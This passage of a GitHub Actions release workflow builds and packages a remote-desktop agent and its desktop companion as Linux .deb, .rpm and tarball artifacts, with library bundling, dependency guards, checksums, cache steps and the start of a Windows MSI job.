          echo "bundled: $(ls "$dst" | tr '\n' ' ')"
          echo "binary RUNPATH -> $(patchelf --print-rpath target/release/roomlerd)"

      - name: Verify the bundled agent loads on stock Ubuntu 24.04
        # The binary is a 22.04 build (glibc 2.34) that links libvpx.so.7; 24.04
        # ships only libvpx.so.9, so this proves the bundled libvpx.so.7 + FFmpeg
        # make the .deb self-contained on 24.04 (22.04 works trivially — native
        # libvpx7 + lower glibc). Only the declared `depends` are installed; the
        # bundle is reached via LD_LIBRARY_PATH (the .deb wires it via RPATH).
        run: |
          set -euo pipefail
          docker run --rm -v "$PWD:/w" ubuntu:24.04 bash -euc '
            apt-get update -qq
            apt-get install -y -qq libxcb1 libxcb-shm0 libxcb-randr0 libasound2t64 >/dev/null
            LD_LIBRARY_PATH=/w/agents/roomlerd/vendor-ffmpeg /w/target/release/roomlerd --version
            # FR-77 P4 — the VA loader chain must come from the bundle: a stock
            # host has no libva2, and the daemon must still start there.
            for l in libva.so.2 libva-drm.so.2 libdrm.so.2; do
              test -f /w/agents/roomlerd/vendor-ffmpeg/$l || { echo "::error::$l missing from the bundle — the daemon would need the system libva"; exit 1; }
            done'

      - name: Build .deb
        working-directory: agents/roomlerd
        run: cargo deb --no-build --no-strip

      # FR-27 — the headless fleet must not grow a desktop stack.
      #
      # The companion ships as its OWN .deb (below) precisely so that k8s
      # workers, build hosts and relays never pull webkit2gtk/GTK to run a
      # menu-bar app they cannot display. That separation is one careless
      # `depends` edit away from being undone, and the regression would be
      # invisible until someone watched an `apt upgrade` on a server pull 200 MB
      # of X11. Assert it here, where it is cheap.
      - name: Guard — the daemon .deb stays headless
        # No `working-directory`: cargo-deb writes to the WORKSPACE target dir,
        # not the member's, so this runs from the repo root exactly like the
        # "Rename + checksum" step below — which has always done so, and is why
        # only the new step broke.
        run: |
          set -euo pipefail
          deb=$(ls target/debian/roomlerd_*_amd64.deb | head -n1)
          depends=$(dpkg-deb -f "$deb" Depends)
          echo "roomlerd Depends: $depends"
          if echo "$depends" | grep -qiE 'webkit|gtk|appindicator|libx11|wayland'; then
            echo "::error::the roomlerd .deb grew a desktop dependency — the companion belongs in its own package (FR-27)"
            exit 1
          fi

      - name: Rename + checksum
        id: pack
        shell: bash
        run: |
          set -euo pipefail
          version="${{ needs.validate-version.outputs.version }}"
          # FR-21 P2a: cargo-deb emits `<package>_<version>_<arch>.deb`, and the
          # package is `roomlerd`. FR-46 (#1051) took the DESTINATION name over
          # too, after measuring every consumer rather than assuming: Windows
          # keys on `.msi` + the `-permachine-` infix, macOS on `.pkg`, Linux
          # >=0.4.16 on `is_daemon_asset` (which ALREADY accepts `roomlerd`),
          # <=0.4.15 on the first `.deb` matching arch, `scripts/install.sh` on
          # an arch+format SUFFIX, and the server-side ordering on a
          # `roomler-desktop-` denylist. Not one of them keys on this prefix, so
          # the rename freezes nothing. Already-published assets keep their old
          # names and stay reachable through the legacy arm.
          src=$(ls target/debian/roomlerd_*_amd64.deb | head -n1)
          dst="roomlerd-${version}-x86_64-unknown-linux-gnu.deb"
          mv "$src" "$dst"
          sha256sum "$dst" | awk '{print $1"  "$2}' > "${dst}.sha256"
          echo "artifact=${dst}" >> "$GITHUB_OUTPUT"

      # The desktop companion's .deb (FR-27) is built by build-linux-companion,
      # in parallel with this job (FR-6 wave 20).

      # Distro-agnostic path for hosts with no dpkg/apt — see
      # docs/linux-self-update.md. Free here: the payload is already staged
      # for cargo-deb, so this is a tar over the same tree.
      - name: Stage the universal tarball
        id: tar
        run: |
          set -euo pipefail
          version="${{ needs.validate-version.outputs.version }}"
          sh scripts/stage-linux-tarball.sh "$version" x86_64-unknown-linux-gnu
          echo "artifact=roomlerd-${version}-x86_64-unknown-linux-gnu.tar.gz" >> "$GITHUB_OUTPUT"

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: linux-deb
          path: |
            ${{ steps.pack.outputs.artifact }}
            ${{ steps.pack.outputs.artifact }}.sha256
            ${{ steps.tar.outputs.artifact }}
            ${{ steps.tar.outputs.artifact }}.sha256
          retention-days: 30

      - name: Save cargo seed (new lockfile generation)
        # always(): preserves cache-on-failure semantics -- a rehearsal
        # that builds and then dies later must still seed (the 07-28
        # incident). Non-tag only: tag-ref saves are unrestorable dead
        # weight. A same-lockfile twin save loses the reservation and
        # warns -- harmless.
        if: always() && github.ref_type != 'tag'
        continue-on-error: true
        uses: ./.github/actions/seed-cache-save
        # GH_TOKEN powers the action's generation-retirement step (keeps
        # the 2 newest generations of this family, deletes the rest) —
        # without it, generations piled to 9.5 GB in a day and LRU evicted
        # the CI lane's caches instead (run 32198738776).
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          shared-key: agent-linux

  # ---------------------------------------------------------------------------
  # 1a. Linux x86_64 desktop companion (FR-27) — its own .deb, in parallel.
  #
  # FR-6 wave 20 (#773): this built at the END of build-linux, after the
  # agent, and added 131-142 s to the critical path of every release
  # (agent-v0.4.115/0.4.116), the Linux twin of what wave 18 moved off the
  # macOS job. The companion shares nothing with the agent's build: it links
  # GTK/WebKit, not FFmpeg or libvpx, and packages separately. The release job
  # flattens every artifact by extension, so this .deb reaches the Release by
  # the same path it always took.
  # ---------------------------------------------------------------------------
  build-linux-companion:
    name: Build desktop companion .deb (Linux x86_64)
    needs: validate-version
    # 22.04 for the same glibc reason as build-linux (see there).
    runs-on: ubuntu-22.04
    timeout-minutes: 60
    steps:
      - uses: actions/checkout@v4

      - name: Configure apt retries and refresh the index
        # See build-linux: a stale index makes the cached step below install
        # nothing and still report success.
        run: |
          echo 'Acquire::Retries "3";' | sudo tee /etc/apt/apt.conf.d/80-ci-retries
          sudo apt-get update -qq

      - name: Install system build deps (cached apt)
        # ⚠️ Byte-identical `packages` and `version` to build-linux, so both
        # jobs restore ONE cache entry and this job never meets the mirror on
        # its own (FR-6 wave 19). The companion uses only the GTK/WebKit +
        # ayatana part; the rest costs nothing on a cache hit.
        uses: awalsh128/cache-apt-pkgs-action@v1
        with:
          packages: libxcb1-dev libxcb-shm0-dev libxcb-randr0-dev cmake libclang-dev pkg-config libvpx-dev libasound2-dev libglib2.0-dev libgtk-3-dev libsoup-3.0-dev libjavascriptcoregtk-4.1-dev libwebkit2gtk-4.1-dev libayatana-appindicator3-dev patchelf
          version: release-linux-u2204-v1

      - name: Verify the companion's build deps landed (fallback to apt-get)
        # Same shape as build-linux's guard, narrowed to what this build
        # consults: pkg-config modules, never the action's status or dpkg.
        run: |
          set -euo pipefail
          pkgs="pkg-config libglib2.0-dev libgtk-3-dev libsoup-3.0-dev libjavascriptcoregtk-4.1-dev libwebkit2gtk-4.1-dev libayatana-appindicator3-dev"
          check() {
            sudo ldconfig
            for m in glib-2.0 gtk+-3.0 libsoup-3.0 javascriptcoregtk-4.1 webkit2gtk-4.1 ayatana-appindicator3-0.1; do
              pkg-config --exists "$m" || { echo "missing: pkg-config module $m"; return 1; }
            done
          }
          if ! check; then
            echo "::warning::the cached apt set did not deliver the companion's build deps; installing directly"
            sudo apt-get update -qq
            # shellcheck disable=SC2086
            sudo apt-get install -y $pkgs
          fi
          check || { echo "::error::companion build deps still missing after the fallback install"; exit 1; }

      - name: Install Rust toolchain
        uses: dtolnay/rust-toolchain@1.95.0

      - name: Restore cargo seed (lockfile-generation keys)
        # Its OWN family: the agent-linux seed stops carrying the companion's
        # artifacts now that build-linux no longer builds it. Same scheme as
        # every other lane (see build-linux and .github/actions/seed-cache-restore).
        continue-on-error: true
        uses: ./.github/actions/seed-cache-restore
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          shared-key: agent-linux-companion

      - name: Install cargo-deb
        # Idempotent, as in build-linux: the seed restores ~/.cargo/bin with
        # the tool already present, and a plain `cargo install` errors on it.
        run: command -v cargo-deb >/dev/null || cargo install cargo-deb --locked

      - name: Install cargo-generate-rpm
        # FR-93 P6d — the companion's RPM. Idempotent like cargo-deb's.
        run: command -v cargo-generate-rpm >/dev/null || cargo install cargo-generate-rpm --locked

      # FR-27: until the companion shipped here, a Linux desktop had no consent
      # prompt and no "being viewed" indicator at all (the daemon's native
      # overlay is Windows-only).
      - name: Build the desktop companion
        run: cargo build -p roomler-desktop --release

      - name: Build the companion .deb
        working-directory: agents/roomler-desktop
        run: cargo deb --no-build --no-strip

      # FR-93 P6d — the same binary as an RPM, for the hosts with no dpkg
      # (Fedora, the RHEL family, openSUSE). From the workspace root, where
      # `target/release/…` resolves; the packaging files resolve in the
      # package's own directory.
      - name: Build the companion .rpm
        run: cargo generate-rpm -p agents/roomler-desktop

      - name: Guard — the companion .rpm requires what the binary links
        # The requires are written out in Cargo.toml (`auto-req = "no"`), because
        # `ldd`'s discovery would name Ubuntu 22.04's transitive sonames, ICU
        # 70's among them, which no Fedora satisfies. A hand-kept list drifts,
        # so read both back: every library the binary links must be required
        # (an RPM missing one installs, then fails to start), and neither the
        # daemon package nor ICU may be.
        run: |
          set -euo pipefail
          sudo apt-get install -y -qq rpm >/dev/null
          rpmf=$(find target/generate-rpm -name 'roomler-desktop-*.rpm' -print | head -n1)
          [ -n "$rpmf" ] || { echo "::error::cargo generate-rpm produced no companion .rpm"; exit 1; }
          rpm -qp --info "$rpmf" | grep -E '^(Name|Version|Release|Architecture)'
          rpm -qp --info "$rpmf" | grep -qE '^Architecture: *x86_64' || { echo "::error::the companion .rpm is not x86_64"; exit 1; }
          rpm -qp --requires "$rpmf" > rpm-requires.txt
          cat rpm-requires.txt
          missing=0
          for so in $(readelf -d target/release/roomler-desktop | sed -n 's/.*(NEEDED).*\[\(.*\)\]/\1/p'); do
            case "$so" in ld-linux*) continue ;; esac
            if ! grep -qF "${so}()(64bit)" rpm-requires.txt; then
              echo "::error::the companion links $so, which its .rpm does not require: add it to [package.metadata.generate-rpm.requires]"
              missing=$((missing + 1))
            fi
          done
          if grep -qiE 'libicu|roomlerd' rpm-requires.txt; then
            echo "::error::the companion .rpm requires the daemon package or ICU by a name no RPM distro shares"
            missing=$((missing + 1))
          fi
          [ "$missing" -eq 0 ]

      - name: Rename + checksum (companion .deb and .rpm)
        id: pack_desktop
        shell: bash
        run: |
          set -euo pipefail
          version="${{ needs.validate-version.outputs.version }}"
          # cargo-deb writes to the WORKSPACE target dir, but pin that with a
          # find rather than a guess: a wrong path here fails the whole release
          # job at its last step.
          src=$(find . -path ./node_modules -prune -o \
                       -name 'roomler-desktop_*_amd64.deb' -print | head -n1)
          [ -n "$src" ] || { echo "::error::cargo deb produced no companion .deb"; exit 1; }
          dst="roomler-desktop-${version}-x86_64-unknown-linux-gnu.deb"
          mv "$src" "$dst"
          sha256sum "$dst" | awk '{print $1"  "$2}' > "${dst}.sha256"
          echo "artifact=${dst}" >> "$GITHUB_OUTPUT"
          # FR-93 P6d — the RPM under the same naming, so `install.sh` finds
          # either by the one pattern with its extension swapped.
          rsrc=$(find target/generate-rpm -name 'roomler-desktop-*.rpm' -print | head -n1)
          [ -n "$rsrc" ] || { echo "::error::cargo generate-rpm produced no companion .rpm"; exit 1; }
          rdst="roomler-desktop-${version}-x86_64-unknown-linux-gnu.rpm"
          mv "$rsrc" "$rdst"
          sha256sum "$rdst" | awk '{print $1"  "$2}' > "${rdst}.sha256"
          echo "rpm=${rdst}" >> "$GITHUB_OUTPUT"

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: linux-companion-deb
          path: |
            ${{ steps.pack_desktop.outputs.artifact }}
            ${{ steps.pack_desktop.outputs.artifact }}.sha256
            ${{ steps.pack_desktop.outputs.rpm }}
            ${{ steps.pack_desktop.outputs.rpm }}.sha256
          if-no-files-found: error
          retention-days: 30

      - name: Save cargo seed (new lockfile generation)
        # always() and non-tag only, for the reasons on build-linux's save.
        if: always() && github.ref_type != 'tag'
        continue-on-error: true
        uses: ./.github/actions/seed-cache-save
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          shared-key: agent-linux-companion

  # ---------------------------------------------------------------------------
  # 1a'. Linux aarch64 desktop companion (FR-93 P6e, decision D5) — the same
  # .deb and .rpm for arm64 hosts. Until this, an Apple-silicon (Asahi) or
  # Ampere desktop had no consent prompt and no "being viewed" banner at all:
  # build-linux-arm64 builds the daemon only. The steps are build-linux-
  # companion's, with the arm64 job's plain apt (that job's cache key is the
  # x86_64 set) and its own seed family.
  # ---------------------------------------------------------------------------
  build-linux-companion-arm64:
    name: Build desktop companion .deb + .rpm (Linux aarch64)
    needs: validate-version
    # 22.04 for the same glibc reason as build-linux-arm64.
    runs-on: ubuntu-22.04-arm
    timeout-minutes: 60
    steps:
      - uses: actions/checkout@v4

      - name: Install system build deps
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            pkg-config libglib2.0-dev libgtk-3-dev libsoup-3.0-dev \
            libjavascriptcoregtk-4.1-dev libwebkit2gtk-4.1-dev \
            libayatana-appindicator3-dev rpm

      - name: Install Rust toolchain
        uses: dtolnay/rust-toolchain@1.95.0

      - name: Restore cargo seed (lockfile-generation keys)
        continue-on-error: true
        uses: ./.github/actions/seed-cache-restore
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          shared-key: agent-linux-companion-arm64

      - name: Install cargo-deb and cargo-generate-rpm
        # Idempotent, as in build-linux-companion.
        run: |
          command -v cargo-deb >/dev/null || cargo install cargo-deb --locked
          command -v cargo-generate-rpm >/dev/null || cargo install cargo-generate-rpm --locked

      - name: Build the desktop companion
        run: cargo build -p roomler-desktop --release

      - name: Build the companion .deb
        working-directory: agents/roomler-desktop
        run: cargo deb --no-build --no-strip

      - name: Build the companion .rpm
        run: cargo generate-rpm -p agents/roomler-desktop

      - name: Guard — the companion .rpm requires what the binary links
        # As in build-linux-companion; `ld-linux-aarch64.so.1` is glibc's.
        run: |
          set -euo pipefail
          rpmf=$(find target/generate-rpm -name 'roomler-desktop-*.rpm' -print | head -n1)
          [ -n "$rpmf" ] || { echo "::error::cargo generate-rpm produced no companion .rpm"; exit 1; }
          rpm -qp --info "$rpmf" | grep -E '^(Name|Version|Release|Architecture)'
          rpm -qp --info "$rpmf" | grep -qE '^Architecture: *aarch64' || { echo "::error::the arm64 companion .rpm is not aarch64"; exit 1; }
          rpm -qp --requires "$rpmf" > rpm-requires.txt
          cat rpm-requires.txt
          missing=0
          for so in $(readelf -d target/release/roomler-desktop | sed -n 's/.*(NEEDED).*\[\(.*\)\]/\1/p'); do
            case "$so" in ld-linux*) continue ;; esac
            if ! grep -qF "${so}()(64bit)" rpm-requires.txt; then
              echo "::error::the companion links $so, which its .rpm does not require: add it to [package.metadata.generate-rpm.requires]"
              missing=$((missing + 1))
            fi
          done
          if grep -qiE 'libicu|roomlerd' rpm-requires.txt; then
            echo "::error::the companion .rpm requires the daemon package or ICU by a name no RPM distro shares"
            missing=$((missing + 1))
          fi
          [ "$missing" -eq 0 ]

      - name: Rename + checksum (companion .deb and .rpm)
        id: pack_desktop
        shell: bash
        run: |
          set -euo pipefail
          version="${{ needs.validate-version.outputs.version }}"
          src=$(find . -path ./node_modules -prune -o \
                       -name 'roomler-desktop_*_arm64.deb' -print | head -n1)
          [ -n "$src" ] || { echo "::error::cargo deb produced no arm64 companion .deb"; exit 1; }
          dst="roomler-desktop-${version}-aarch64-unknown-linux-gnu.deb"
          mv "$src" "$dst"
          sha256sum "$dst" | awk '{print $1"  "$2}' > "${dst}.sha256"
          echo "artifact=${dst}" >> "$GITHUB_OUTPUT"
          rsrc=$(find target/generate-rpm -name 'roomler-desktop-*.rpm' -print | head -n1)
          [ -n "$rsrc" ] || { echo "::error::cargo generate-rpm produced no arm64 companion .rpm"; exit 1; }
          rdst="roomler-desktop-${version}-aarch64-unknown-linux-gnu.rpm"
          mv "$rsrc" "$rdst"
          sha256sum "$rdst" | awk '{print $1"  "$2}' > "${rdst}.sha256"
          echo "rpm=${rdst}" >> "$GITHUB_OUTPUT"

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: linux-companion-arm64
          path: |
            ${{ steps.pack_desktop.outputs.artifact }}
            ${{ steps.pack_desktop.outputs.artifact }}.sha256
            ${{ steps.pack_desktop.outputs.rpm }}
            ${{ steps.pack_desktop.outputs.rpm }}.sha256
          if-no-files-found: error
          retention-days: 30

      - name: Save cargo seed (new lockfile generation)
        if: always() && github.ref_type != 'tag'
        continue-on-error: true
        uses: ./.github/actions/seed-cache-save
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          shared-key: agent-linux-companion-arm64

  # ---------------------------------------------------------------------------
  # 1b. Linux aarch64 — the same .deb for arm64 hosts.
  #
  # Why this exists: without an arm64 asset the updater's asset picker finds
  # no match and every check ends "no installer asset for this platform", so
  # `Update all` from the web UI is a permanent no-op on an arm64 box. Field
  # case 2026-08-15 on a Fedora Asahi Remix host (Apple M2) that meshes and
  # screen-shares fine but could never self-update.
  #
  # Deliberately WITHOUT `ffmpeg-encoder`: the vendored FFmpeg 9.0.1 tree is
  # published for linux64/macos-arm64 only, there is no linux-arm64 build to
  # fetch, and the backend it feeds dispatches to nvenc/qsv/amf — none of
  # which exist on the Apple-silicon and Ampere hosts this targets. Dropping
  # it also keeps this lane on the P3e size trajectory (no 20 MB of FFmpeg in
  # a package whose encoders would all fail to init). Video on arm64 is
  # openh264 (SW H.264) + libvpx VP9-444, both field-verified.
  # ---------------------------------------------------------------------------
  build-linux-arm64:
    name: Build .deb (Linux aarch64)
    needs: validate-version
    # 22.04 for the same glibc reason as the x86_64 lane: build on the OLDEST
    # supported base so the binary loads on 22.04 AND 24.04.
    runs-on: ubuntu-22.04-arm
    timeout-minutes: 60
    steps:
      - uses: actions/checkout@v4

      - name: Install system build deps
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            libxcb1-dev libxcb-shm0-dev libxcb-randr0-dev \
            cmake libclang-dev pkg-config \
            libvpx-dev \
            libasound2-dev \
            patchelf

      - name: Install Rust toolchain
        uses: dtolnay/rust-toolchain@1.95.0

      - name: Restore cargo seed (lockfile-generation keys)
        # Explicit actions/cache with OUR key scheme -- rust-cache cannot
        # express "unique key + prefix restore + no env hash": with
        # add-rust-environment-hash-key:false its `key:` input is folded
        # into the dropped component (a no-op -- #482, re-proven by probe
        # run 31907241610). Unique key per Cargo.lock => saves always
        # land; prefix restore => never an absent-key window (the rc.382
        # race); no env hash => no runner-image warm/cold lottery. Full
        # story in .github/actions/seed-cache-restore. The paired save
        # step is at the end of this job.
        continue-on-error: true
        uses: ./.github/actions/seed-cache-restore
        # GH_TOKEN: the asset-based restore downloads from the seed-cache
        # release (probe run 32903453670 built cold on every lane for want
        # of it — the old actions/cache restore needed no token).
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          shared-key: agent-linux-arm64

      - name: Install cargo-deb
        # Idempotent: the lockfile-generation seed caches (#488) restore
        # ~/.cargo/bin WITH the tool already present, and a plain
        # `cargo install` hard-errors on an existing binary (rc.383's
        # release run died on exactly this in all three build jobs).
        run: command -v cargo-deb >/dev/null || cargo install cargo-deb --locked

      - name: Build agent (release, full + vp9-444, no ffmpeg-encoder)
        env:
          CMAKE_POLICY_VERSION_MINIMUM: "3.5"
        run: cargo build -p roomlerd --release --features "full,hive,vp9-444,vp9-444-bindgen,overlay-l3,overlay-netstack,ssh-server,viewer-indicator-x11"

      - name: Build the roomler CLI shim (shipped in the .deb alongside roomlerd)
        run: |
          set -euo pipefail
          cargo build -p roomler-cli-shim --release
          test -f target/release/roomler-shim || { echo "::error::roomler-shim not produced — the cargo-deb assets entry would fail"; exit 1; }

      - name: Bundle libvpx into the .deb (self-contained, RPATH)
        run: |
          set -euo pipefail
          # Same ABI trap as the x86_64 lane: the agent links this runner's
          # libvpx-dev (1.12 / libvpx.so.7 on 22.04) and stock 24.04 ships only
          # libvpx.so.9, so without carrying it the .deb installs cleanly and
          # then aborts at load. The cargo-deb assets glob is
          # `vendor-ffmpeg/*.so.*` — CI-populated and shared with the x86_64
          # lane's FFmpeg bundle; here it carries libvpx alone.
          dst=agents/roomlerd/vendor-ffmpeg
          rm -rf "$dst" && mkdir -p "$dst"
          vpx7=$(readlink -f /usr/lib/aarch64-linux-gnu/libvpx.so.7)
          cp "$vpx7" "$dst/libvpx.so.7"
          [ -f "$dst/libvpx.so.7" ] || { echo "::error::libvpx.so.7 not bundled — agent aborts at load on 24.04"; exit 1; }
          for lib in "$dst"/*.so.*; do patchelf --set-rpath '$ORIGIN' "$lib"; done
          patchelf --set-rpath '/usr/lib/roomler-agent' target/release/roomlerd
          echo "bundled: $(ls "$dst" | tr '\n' ' ')"
          echo "binary RUNPATH -> $(patchelf --print-rpath target/release/roomlerd)"

      - name: Verify the bundled agent loads on stock Ubuntu 24.04 (arm64)
        run: |
          set -euo pipefail
          docker run --rm -v "$PWD:/w" ubuntu:24.04 bash -euc '
            apt-get update -qq
            apt-get install -y -qq libxcb1 libxcb-shm0 libxcb-randr0 libasound2t64 >/dev/null
            LD_LIBRARY_PATH=/w/agents/roomlerd/vendor-ffmpeg /w/target/release/roomlerd --version'

      - name: Build .deb
        working-directory: agents/roomlerd
        run: cargo deb --no-build --no-strip

      - name: Rename + checksum
        id: pack
        shell: bash
        run: |
          set -euo pipefail
          version="${{ needs.validate-version.outputs.version }}"
          # FR-21 P2a: cargo-deb emits `<package>_<version>_<arch>.deb`, and the
          # package is `roomlerd`. FR-46 (#1051) took the DESTINATION name over
          # too, after measuring every consumer rather than assuming: Windows
          # keys on `.msi` + the `-permachine-` infix, macOS on `.pkg`, Linux
          # >=0.4.16 on `is_daemon_asset` (which ALREADY accepts `roomlerd`),
          # <=0.4.15 on the first `.deb` matching arch, `scripts/install.sh` on
          # an arch+format SUFFIX, and the server-side ordering on a
          # `roomler-desktop-` denylist. Not one of them keys on this prefix, so
          # the rename freezes nothing. Already-published assets keep their old
          # names and stay reachable through the legacy arm.
          src=$(ls target/debian/roomlerd_*_arm64.deb | head -n1)
          dst="roomlerd-${version}-aarch64-unknown-linux-gnu.deb"
          mv "$src" "$dst"
          sha256sum "$dst" | awk '{print $1"  "$2}' > "${dst}.sha256"
          echo "artifact=${dst}" >> "$GITHUB_OUTPUT"

      # Same universal path as the x86_64 lane. This is the one that unblocks
      # the Fedora Asahi field host: aarch64 AND no dpkg.
      - name: Stage the universal tarball
        id: tar
        run: |
          set -euo pipefail
          version="${{ needs.validate-version.outputs.version }}"
          sh scripts/stage-linux-tarball.sh "$version" aarch64-unknown-linux-gnu
          echo "artifact=roomlerd-${version}-aarch64-unknown-linux-gnu.tar.gz" >> "$GITHUB_OUTPUT"

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: linux-deb-arm64
          path: |
            ${{ steps.pack.outputs.artifact }}
            ${{ steps.pack.outputs.artifact }}.sha256
            ${{ steps.tar.outputs.artifact }}
            ${{ steps.tar.outputs.artifact }}.sha256
          retention-days: 30

      - name: Save cargo seed (new lockfile generation)
        # always(): preserves cache-on-failure semantics -- a rehearsal
        # that builds and then dies later must still seed (the 07-28
        # incident). Non-tag only: tag-ref saves are unrestorable dead
        # weight. A same-lockfile twin save loses the reservation and
        # warns -- harmless.
        if: always() && github.ref_type != 'tag'
        continue-on-error: true
        uses: ./.github/actions/seed-cache-save
        # GH_TOKEN powers the action's generation-retirement step (keeps
        # the 2 newest generations of this family, deletes the rest) —
        # without it, generations piled to 9.5 GB in a day and LRU evicted
        # the CI lane's caches instead (run 32198738776).
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          shared-key: agent-linux-arm64

  # ---------------------------------------------------------------------------
  # 2. Windows — MSI via cargo-wix. The MSI PAYLOAD (roomlerd.exe + the
  #    roomler.exe shim) is signed before the harvest and the MSIs themselves
  #    afterwards; see ./.github/actions/sign-windows. On a release tag,
  #    unsigned fails the job.
  # ---------------------------------------------------------------------------
  build-windows:
    name: Build .msi (Windows x86_64)
    needs: validate-version
    runs-on: windows-latest
    timeout-minutes: 90
    # The Entra federated credential for azure-mode signing is bound to this
    # GitHub environment (the tenant rejects wildcard tag subjects) — removing
    # the environment line breaks the OIDC exchange. No protection rules are
    # configured on it, so it adds no approval friction.
    environment: release
    # Workflow-level permissions make every unlisted scope `none`, so id-token
    # must be granted explicitly. Per-job to keep the OIDC blast radius small.
    permissions:
      # contents:WRITE (was read): seed-cache-save publishes the cargo seed
      # tarballs to the rolling `seed-cache` release — with read, every
      # Windows upload died `HTTP 403: Resource not accessible by
      # integration` (run 32981405188) while linux/macos (workflow-level
      # perms) published fine. Read sufficed only while seeds lived in
      # actions/cache. Widens this signing-identity job's blast radius from
      # read to write on repo contents — reviewed trade-off; the workflow
      # default was contents:write before the OIDC narrowing.
      contents: write
      id-token: write     # azure/login OIDC inside ./.github/actions/sign-windows
      actions: write      # seed-cache-save retires old cache generations via `gh api DELETE`
    env:
      VERSION: ${{ needs.validate-version.outputs.version }}
      # Monotonic MSI ProductVersion (rc in the 3rd/build field) so
      # MajorUpgrade fires — see the derivation in the validate-version
      # job. VERSION (the readable semver) still names the .msi files.
      MSI_VERSION: ${{ needs.validate-version.outputs.msi_version }}
    steps:
      - uses: actions/checkout@v4

      - name: Locate LLVM (provides libclang for bindgen)
        shell: pwsh
        run: |
          # windows-latest ships LLVM (v20+) pre-installed under
          # C:\Program Files\LLVM. Just point bindgen at it — don't try to
          # downgrade via chocolatey (choco refuses without --allow-downgrade).
          $llvm = "C:\Program Files\LLVM"
          if (-not (Test-Path $llvm)) {
            choco install -y llvm
            $llvm = "C:\Program Files\LLVM"
          }
          "LIBCLANG_PATH=$llvm\bin" | Out-File -FilePath $env:GITHUB_ENV -Append
          "$llvm\bin"              | Out-File -FilePath $env:GITHUB_PATH -Append
          & "$llvm\bin\clang.exe" --version

      # pkgconf is ~1 MB of prebuilt tool, but `vcpkg install` spends ~96 s per
      # run (measured on the rc.363 release: the 3rd-costliest step in this
      # job) re-materialising it. Cache the tools dir so the step below
      # degenerates into a PATH append. Same GitHub cache-isolation rule as the
      # Swatinem blocks: a save on a tag ref can never be restored by a future
      # tag, so only non-tag runs (the master seed rehearsals) write it while
      # tag runs restore the default-branch entry. The key is deliberately
      # constant — pkgconf is a frozen build tool here, not a dependency; bump
      # the -vN suffix if it ever needs refreshing.
      - name: Restore cached pkgconf
        id: pkgconf_cache
        continue-on-error: true
        uses: actions/cache/restore@v4
        with:
          path: C:\vcpkg\installed\x64-windows\tools\pkgconf
          key: pkgconf-x64-windows-v1

      - name: Install pkg-config (env-libvpx-sys + ffmpeg-sys build scripts need it)
        id: pkgconf_install
        shell: pwsh
        run: |
          # `env-libvpx-sys` / `ffmpeg-sys-next` build.rs shell out to
          # `pkg-config`; windows-latest ships none. We install vcpkg's
          # `pkgconf` from the pre-installed vcpkg at C:\vcpkg (the ONLY
          # remaining vcpkg use in this job — libvpx + FFmpeg are fetched
          # prebuilt from the vendored-* releases below), so this pulls
          # from the vcpkg registry, NOT SourceForge. The old `choco
          # pkgconfiglite` downloaded its binary from SourceForge, which
          # timed out and failed the rc.151 MSI build. Kept as a retried
          # fallback.
          $tools = 'C:\vcpkg\installed\x64-windows\tools\pkgconf'
          $got = $false
          # Cache hit: the tools dir is already on disk (including the
          # pkg-config.exe alias, which was copied in before the save), so
          # skip the vcpkg install entirely.
          if (Test-Path "$tools\pkgconf.exe") {
            Write-Host "pkgconf restored from cache — skipping vcpkg install"
            Copy-Item "$tools\pkgconf.exe" "$tools\pkg-config.exe" -Force
            $tools | Out-File -FilePath $env:GITHUB_PATH -Append
            $env:PATH = "$tools;$env:PATH"
            $got = $true
          }
          if (-not $got -and (Test-Path 'C:\vcpkg\vcpkg.exe')) {
            C:\vcpkg\vcpkg.exe install pkgconf:x64-windows
            if (Test-Path "$tools\pkgconf.exe") {
              # The *-sys scripts invoke the command `pkg-config`; pkgconf is
              # a drop-in replacement, so expose it under that name too.
              Copy-Item "$tools\pkgconf.exe" "$tools\pkg-config.exe" -Force
              $tools | Out-File -FilePath $env:GITHUB_PATH -Append
              $env:PATH = "$tools;$env:PATH"
              $got = $true
            }
          }
          if (-not $got) {
            Write-Host "vcpkg pkgconf unavailable — falling back to choco pkgconfiglite (SourceForge; retried)"
            for ($i = 1; $i -le 3; $i++) {
              choco install -y pkgconfiglite
              if (Get-Command pkg-config -ErrorAction SilentlyContinue) { break }
              Write-Host "pkgconfiglite attempt $i failed (likely SourceForge); retrying in 15s"
              Start-Sleep -Seconds 15
            }
          }
          # Tells the save step below whether there is actually a vcpkg-shaped
          # tools dir worth caching (the choco fallback leaves it empty).
          # NB `hashFiles()` can't be used for this: it only globs inside
          # GITHUB_WORKSPACE, so it would silently return '' for a C:\vcpkg
          # path and the save would never run.
          $hasVcpkgPkgconf = if (Test-Path (Join-Path $tools 'pkgconf.exe')) { 'true' } else { 'false' }
          "vcpkg_pkgconf=$hasVcpkgPkgconf" | Out-File -FilePath $env:GITHUB_OUTPUT -Append
          # Fails the step loudly if neither path produced a usable pkg-config.
          pkg-config --version

      # Only seeds from non-tag runs (see the restore step's comment), and only
      # when the vcpkg tools dir is really populated — GitHub cache keys are
      # write-once, so caching an empty dir under this key would stick.
      - name: Save pkgconf cache
        if: steps.pkgconf_cache.outputs.cache-hit != 'true' && github.ref_type != 'tag' && steps.pkgconf_install.outputs.vcpkg_pkgconf == 'true'
        continue-on-error: true
        uses: actions/cache/save@v4
        with:
          path: C:\vcpkg\installed\x64-windows\tools\pkgconf
          key: pkgconf-x64-windows-v1

      - name: Fetch vendored libvpx 1.12.0 (matches pre-generated bindings)
        shell: pwsh
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          $ErrorActionPreference = 'Stop'
          # We DON'T enable `vp9-444-bindgen` on Windows because bindgen
          # 0.68.1 + libclang on Windows has a regression that opaques
          # `vpx_codec_enc_cfg` (forward-declared in vpx_codec.h's union
          # before its full def in vpx_encoder.h) — every field becomes
          # `_address: u8` and the build collapses. Local-repro confirms
